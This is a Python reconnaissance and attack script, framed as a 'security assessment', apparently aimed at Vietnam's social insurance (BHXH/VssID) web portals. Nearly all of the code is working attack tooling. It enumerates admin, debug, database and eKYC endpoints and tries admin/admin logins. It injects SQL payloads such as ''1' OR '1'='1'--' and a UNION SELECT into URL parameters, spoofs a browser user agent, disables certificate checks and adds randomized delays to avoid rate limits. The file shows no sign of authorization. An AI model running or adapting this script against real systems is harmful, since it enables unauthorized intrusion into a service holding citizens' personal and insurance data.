#!/usr/bin/env python3
"""
BHXH Security Assessment - API Discovery Module
Enhanced version for comprehensive endpoint discovery and vulnerability detection
"""

import requests
import json
import time
import random
from urllib.parse import urljoin, urlparse
from config import TARGET_CONFIG, COMMON_ENDPOINTS

class APIDiscovery:
    def __init__(self):
        self.base_urls = [TARGET_CONFIG["base_url"]] + TARGET_CONFIG["secondary_urls"]
        self.discovered_endpoints = []
        self.vulnerable_endpoints = []
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        })
        
        self.results = {
            "discovered_endpoints": [],
            "vulnerable_endpoints": [],
            "error_responses": [],
            "database_errors": [],
            "authentication_endpoints": [],
            "admin_endpoints": [],
            "api_documentation": []
        }
    
    def discover_endpoints(self):
        """Discover API endpoints across all target URLs"""
        print("[*] Starting comprehensive API endpoint discovery...")
        
        for base_url in self.base_urls:
            print(f"[*] Scanning {base_url}...")
            self.scan_base_url(base_url)
        
        print(f"[+] Discovery completed. Found {len(self.discovered_endpoints)} endpoints")
        return self.discovered_endpoints
    
    def scan_base_url(self, base_url):
        """Scan a base URL for endpoints"""
        # Test common endpoints
        for endpoint in COMMON_ENDPOINTS:
            full_url = urljoin(base_url, endpoint)
            self.test_endpoint(full_url)
            
            # Add small delay to avoid rate limiting
            time.sleep(random.uniform(0.1, 0.3))
        
        # Test specific BHXH/VssID endpoints
        vssid_endpoints = [
            "vssid/api/v1/auth/login",
            "vssid/api/v1/user/profile",
            "vssid/api/v1/document/upload",
            "vssid/api/v1/ekyc/verify",
            "api/bhxh/customer/search",
            "api/bhxh/insurance/lookup",
            "api/bhxh/claim/submit",
            "sharepoint/_api/web/lists",
            "sessionstate/api/session",
            "admin/api/users",
            "admin/api/database",
            "debug/database/connection",
            "debug/sessionstate/info"
        ]
        
        for endpoint in vssid_endpoints:
            full_url = urljoin(base_url, endpoint)
            self.test_endpoint(full_url)
            time.sleep(random.uniform(0.2, 0.5))
    
    def test_endpoint(self, url):
        """Test an individual endpoint"""
        try:
            # Test different HTTP methods
            methods = ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS']
            
            for method in methods[:2]:  # Test GET and POST primarily
                try:
                    if method == 'GET':
                        response = self.session.get(url, timeout=10, verify=False)
                    elif method == 'POST':
                        # Test with common payloads
                        payloads = [
                            {},
                            {"username": "admin", "password": "admin"},
                            {"action": "test", "data": "sample"}
                        ]
                        
                        for payload in payloads[:1]:  # Test first payload
                            response = self.session.post(url, json=payload, timeout=10, verify=False)
                            self.analyze_response(url, method, response, payload)
                            break
                        continue
                    
                    self.analyze_response(url, method, response)
                    
                except requests.exceptions.RequestException as e:
                    # Sometimes connection errors can reveal information
                    if "database" in str(e).lower() or "sessionstate" in str(e).lower():
                        self.results["database_errors"].append({
                            "url": url,
                            "error": str(e),
                            "method": method
                        })
                
        except Exception as e:
            pass  # Continue with other endpoints
    
    def analyze_response(self, url, method, response, payload=None):
        """Analyze HTTP response for vulnerabilities and information"""
        endpoint_info = {
            "url": url,
            "method": method,
            "status_code": response.status_code,
            "response_size": len(response.content),
            "headers": dict(response.headers),
            "payload": payload
        }
        
        # Add to discovered endpoints
        if response.status_code not in [404, 403]:
            self.discovered_endpoints.append(endpoint_info)
            self.results["discovered_endpoints"].append(endpoint_info)
        
        # Check for database errors (critical for BHXH)
        response_text = response.text.lower()
        database_indicators = [
            "sessionstateservice",
            "sql server",
            "database error",
            "bhxh\\sharepoint_portal",
            "0x80131904",
            "connection failed",
            "login failed for user",
            "cannot open database"
        ]
        
        for indicator in database_indicators:
            if indicator in response_text:
                vulnerability = {
                    "url": url,
                    "method": method,
                    "vulnerability_type": "Database Error Exposure",
                    "severity": "HIGH",
                    "evidence": indicator,
                    "response_snippet": response.text[:500]
                }
                self.vulnerable_endpoints.append(vulnerability)
                self.results["database_errors"].append(vulnerability)
                print(f"[!] DATABASE ERROR FOUND: {url} - {indicator}")
        
        # Check for authentication endpoints
        auth_indicators = ["login", "auth", "authenticate", "signin", "token"]
        if any(indicator in url.lower() for indicator in auth_indicators):
            self.results["authentication_endpoints"].append(endpoint_info)
        
        # Check for admin endpoints
        admin_indicators = ["admin", "administrator", "management", "console"]
        if any(indicator in url.lower() for indicator in admin_indicators):
            self.results["admin_endpoints"].append(endpoint_info)
        
        # Check for API documentation
        if response.status_code == 200:
            doc_indicators = ["swagger", "openapi", "api-docs", "documentation"]
            if any(indicator in response_text for indicator in doc_indicators):
                self.results["api_documentation"].append(endpoint_info)
        
        # Check for interesting headers
        interesting_headers = ["server", "x-powered-by", "x-aspnet-version", "x-sharepoint-version"]
        for header in interesting_headers:
            if header in response.headers:
                endpoint_info["interesting_headers"] = {
                    header: response.headers[header]
                }
        
        # Check for error messages that might reveal information
        error_patterns = [
            r"error.*?(database|sql|connection)",
            r"exception.*?(sharepoint|asp\.net)",
            r"failed.*?(login|authentication)",
            r"sessionstate.*?(error|exception)"
        ]
        
        import re
        for pattern in error_patterns:
            if re.search(pattern, response_text, re.IGNORECASE):
                self.results["error_responses"].append({
                    "url": url,
                    "method": method,
                    "error_pattern": pattern,
                    "response_snippet": response.text[:300]
                })
    
    def analyze_endpoints(self):
        """Analyze discovered endpoints for additional vulnerabilities"""
        print("[*] Analyzing discovered endpoints for vulnerabilities...")
        
        # Test for SQL injection on discovered endpoints
        for endpoint_info in self.discovered_endpoints:
            if endpoint_info["status_code"] == 200:
                self.test_sql_injection(endpoint_info["url"])
        
        # Generate endpoint analysis summary
        self.generate_endpoint_summary()
    
    def test_sql_injection(self, url):
        """Test endpoint for SQL injection vulnerabilities"""
        sqli_payloads = [
            "1' OR '1'='1'--",
            "admin'--",
            "' OR 1=1--",
            "1' UNION SELECT @@version--"
        ]
        
        # Test via URL parameters
        for payload in sqli_payloads[:2]:  # Test first 2 payloads
            try:
                test_url = f"{url}?id={payload}&search={payload}"
                response = self.session.get(test_url, timeout=5, verify=False)
                
                # Check for SQL error indicators
                if any(indicator in response.text.lower() for indicator in 
                       ["sql", "database", "syntax error", "mysql", "postgresql", "mssql"]):
                    
                    vulnerability = {
                        "url": url,
                        "vulnerability_type": "SQL Injection",
                        "severity": "CRITICAL",
                        "payload": payload,
                        "evidence": response.text[:200]
                    }
                    self.vulnerable_endpoints.append(vulnerability)
                    self.results["vulnerable_endpoints"].append(vulnerability)
                    print(f"[!] SQL INJECTION FOUND: {url}")
                    
            except:
                continue
    
    def generate_endpoint_summary(self):
        """Generate summary of endpoint discovery"""
        summary = {
            "total_endpoints_tested": len(COMMON_ENDPOINTS) * len(self.base_urls),
            "total_discovered": len(self.discovered_endpoints),
            "authentication_endpoints": len(self.results["authentication_endpoints"]),
            "admin_endpoints": len(self.results["admin_endpoints"]),
            "vulnerable_endpoints": len(self.vulnerable_endpoints),
            "database_errors": len(self.results["database_errors"]),
            "api_documentation": len(self.results["api_documentation"])
        }
        
        self.results["summary"] = summary
        return summary
    
    def display_results(self):
        """Display discovery results"""
        print("\n" + "="*60)
        print("API DISCOVERY RESULTS")
        print("="*60)
        
        summary = self.results.get("summary", {})
        print(f"Endpoints tested: {summary.get('total_endpoints_tested', 0)}")
        print(f"Endpoints discovered: {summary.get('total_discovered', 0)}")
        print(f"Authentication endpoints: {summary.get('authentication_endpoints', 0)}")  
        print(f"Admin endpoints: {summary.get('admin_endpoints', 0)}")
        print(f"Vulnerable endpoints: {summary.get('vulnerable_endpoints', 0)}")
        print(f"Database errors: {summary.get('database_errors', 0)}")
        
        # Display critical findings
        if self.results["database_errors"]:
            print("\n🚨 CRITICAL DATABASE ERRORS:")
            for error in self.results["database_errors"][:3]:
                print(f"  - {error['url']}: {error.get('evidence', 'Database error detected')}")
        
        if self.vulnerable_endpoints:
            print("\n⚠️ VULNERABLE ENDPOINTS:")
            for vuln in self.vulnerable_endpoints[:3]:
                print(f"  - {vuln['url']}: {vuln['vulnerability_type']} ({vuln['severity']})")
        
        print("="*60)
    
    def save_results(self):
        """Save discovery results"""
        output_file = f"{TARGET_CONFIG['output_dir']}/api_discovery_results.json"
        
        try:
            with open(output_file, 'w', encoding='utf-8') as f:
                json.dump(self.results, f, indent=2, ensure_ascii=False)
            
            print(f"[+] API discovery results saved to: {output_file}")
            return True
            
        except Exception as e:
            print(f"[-] Error saving results: {e}")
            return False

def main():
    """Test the API discovery module"""
    discovery = APIDiscovery()
    
    print("Starting API discovery test...")
    discovery.discover_endpoints()
    discovery.analyze_endpoints()
    discovery.display_results()
    discovery.save_results()

if __name__ == "__main__":
    main()
